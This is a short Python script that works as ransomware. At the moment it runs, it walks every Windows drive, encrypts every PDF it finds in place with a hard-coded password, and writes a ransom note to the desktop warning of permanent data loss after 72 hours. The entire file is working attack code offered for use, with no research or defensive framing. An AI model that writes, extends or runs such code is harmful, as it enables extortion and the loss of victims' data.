import os
from PyPDF2 import PdfReader, PdfWriter
import string

# Define the encryption password
password = "12345"

# Function to encrypt a single PDF file
def encrypt_pdf(filepath, password):
    try:
        pdf_reader = PdfReader(filepath)
        pdf_writer = PdfWriter()

        # Copy all pages to the writer and encrypt them
        for page_num in range(len(pdf_reader.pages)):
            pdf_writer.add_page(pdf_reader.pages[page_num])

        pdf_writer.encrypt(password)

        # Overwrite the original file
        with open(filepath, "wb") as f:
            pdf_writer.write(f)

        print(f"Encrypted {filepath}")
    except Exception as e:
        print(f"Failed to encrypt {filepath}: {e}")

# Function to search and encrypt all PDFs in the system
def encrypt_all_pdfs(root_dir, password):
    for dirpath, _, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.endswith(".pdf"):
                filepath = os.path.join(dirpath, filename)
                encrypt_pdf(filepath, password)

# Function to get all available drives and start encryption on each
def encrypt_all_drives(password):
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        print(f"Encrypting PDFs in {drive}")
        encrypt_all_pdfs(drive, password)

# Function to create a ransom note on the desktop
def create_ransom_note():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    note_path = os.path.join(desktop_path, "README_FOR_DECRYPTION.txt")

    # Ransom note content
    ransom_note = (
        "Your files have been encrypted! "
        "\n\n"
        "Failure to communicate within 72 hours will result in permanent loss of data."
    )

    # Write the ransom note to a text file
    with open(note_path, "w") as file:
        file.write(ransom_note)

# Start the encryption process for all drives
encrypt_all_drives(password)

# Create the ransom note on the desktop
create_ransom_note()
